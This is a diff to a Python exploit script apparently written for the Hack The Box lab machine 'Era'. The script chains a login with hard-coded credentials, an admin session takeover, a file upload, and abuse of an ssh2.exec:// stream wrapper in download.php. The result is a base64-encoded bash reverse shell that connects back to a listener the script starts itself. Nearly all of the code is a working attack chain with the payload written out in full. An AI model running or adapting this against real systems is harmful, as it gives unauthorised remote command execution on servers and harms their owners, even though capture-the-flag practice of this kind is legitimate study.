@@ -25,10 +25,10 @@ LOGOUT_URL = "http://file.era.htb/logout.php"
 SECURITY_URL = "http://file.era.htb/security_login.php"
 DASHBOARD_URL = "http://file.era.htb/manage.php"
 TARGET_URL = "http://file.era.htb/download.php"
+UPLOAD_URL = "http://file.era.htb/upload.php"
 
-
-username = "yuri"
-password = "mustang"
+username = "yuri" #change if necessary
+password = "mustang" #change if necessary
 
 ANSWER = "test"
 admin = "admin_ef01cab31aa"
@@ -40,7 +40,7 @@ def parse_args():
     parser.add_argument("--no-listen", action="store_true", help="Skip auto listener")
     return parser.parse_args()
 
-
+#Basic login
 def login(username, password):
     
     session = requests.session()
@@ -84,7 +84,7 @@ def login(username, password):
     return session
 
 
-
+#Admin login
 def get_admin(session_value):
     #Getting Admin Access
     
@@ -150,50 +150,79 @@ def get_admin(session_value):
     else:
         logging.warning("[-] Stuck on login.php")   
         sys.exit("[-] Exiting: Admin login failed or redirected.")
+        
     return admin_session
     
     
- 
+#Checks file on the server
 def check_available_files(session):
-    url = DASHBOARD_URL
-    response = session.get(url)
-    
-    if response.status_code != 200:
-        logging.warning("[-] Failed to load dashboard")
-        return[]
-        
-    html = response.text
-    #Match links like :<a href="download.php?id=150">filename.ext<a>
-    pattern = r'<a\s+href="download\.php\?id=(\d+)">([^<]+)</a>'
-    matches = re.findall(pattern, html)
-    
     files = []
-    for file_id, filename in matches:
-        files.append((file_id, filename.strip()))
-        logging.info(f"[+] Found file: {filename.strip()} (ID: {file_id})")
-    
-    return files
-    
-    
-def exploit(session, files, ip, port):
 
-    if not files:
-        sys.exit("[-] Exiting: No files found on server, please upload one.")
+    while not files:
+        response = session.get(DASHBOARD_URL)
+        if response.status_code != 200:
+            logging.warning("[-] Failed to load dashboard")
+            sys.exit("[-] Exiting: Exploit Failed.")
+
+        html = response.text
+        # Match links like: <a href="download.php?id=150">filename.ext</a>
+        pattern = r'<a\s+href="download\.php\?id=(\d+)">([^<]+)</a>'
+        matches = re.findall(pattern, html)
+
+        for file_id, filename in matches:
+            files.append((file_id, filename.strip()))
+            logging.info(f"[+] Found file: {filename.strip()} (ID: {file_id})")
+
+        if not files:
+            logging.warning("[-] No files found on server, trying to upload one...")
+            upload_file(session)
+            time.sleep(2)  # short delay to allow file processing
+
+    return files
+
+#Uploads file if necessary
+def upload_file(session):
+
+    file_name = "barrel_of_nails.txt"
+    file_content = b"This is a dummy file for RCE"
+    
+    files = {
+       "upfile[]": (file_name, file_content, "text/plain")
+    }
+    
+    data = {
+        "fsubmitted":"true"
+    }
+    
+    upload = session.post(UPLOAD_URL, files=files, data=data)
+    
+    if upload.status_code == 200:
+        logging.info(f"[+] Successfully uploaded dummy file: {file_name}")
+        return True
+        
+    else:
+        logging.warning("[-] Failed to upload dummy file.")
+        sys.exit("[-] Exiting: Exploit Failed.")
+    
+        
+def exploit(session, files, ip, port):
 
     file_id, filename = files[0]
     logging.info(f"[+] Using file: {filename} (ID: {file_id})")
-
+    
+    #Payload will be available in terminal, you might want to check it manually
     raw_payload = f'/bin/bash -i >& /dev/tcp/{ip}/{port} 0>&1'
-    encoded_payload = base64.b64encode(raw_payload.encode()).decode()
+    encoded_payload = base64.b64encode(raw_payload.encode()).decode() # Was unstable without encoding
     cmd = f'echo {encoded_payload}|base64 -d|bash|'
 
     TARGET = f"{TARGET_URL}?id={file_id}&show=true&format=ssh2.exec://yuri:mustang@127.0.0.1/{cmd}"
-    logging.info(f"[+] Sending payload to: {TARGET}")
+    logging.info(f"[+] Sending payload: {TARGET}")
     r = session.get(TARGET, allow_redirects=True)
     
     logging.info(f"[+] Triggering shell... enjoy")
     time.sleep(1)
-    
+
+ 
 
 def start_listener(port):
     logging.info(f"[+] Starting listener on port {port}...")
@@ -205,27 +234,37 @@ def start_listener(port):
         stderr=subprocess.DEVNULL
     )
     
-if __name__ == "__main__":             
+if __name__ == "__main__":     
+        
     args = parse_args()
     ip = args.ip
     port = args.port
+        
+    if not (1 <= port <= 65535):
+        sys.exit("[-] Invalid port number")
+    
+    if port > 10000:
+        logging.warning("[!] Ports above 10000 may be blocked by HTB or your local firewall. Use ports like 4444, 9001, or 5050.")
+    elif port < 1024:
+        logging.warning("[!] Ports below 1024 require admin privileges to work as intended")
+        
     logging.info(f"[+] Using IP: {ip}")
     logging.info(f"[+] Using PORT: {port}")
-     
+      
     session = login(username, password)
     admin_session = get_admin(session)
-    files = check_available_files(admin_session)
+    files = check_available_files(admin_session)       
 
     if not args.no_listen:
+    
         try:
             listener_proc = start_listener(port)
             time.sleep(2)  # Give listener time to spin up
             exploit(admin_session, files, ip, port)
             listener_proc.wait()
+            
         except KeyboardInterrupt:
             print("\n[!] Interrupted. Cleaning up...")
             listener_proc.terminate()
     else:
         exploit(admin_session, files, ip, port)
-            listener_proc.terminate()
-
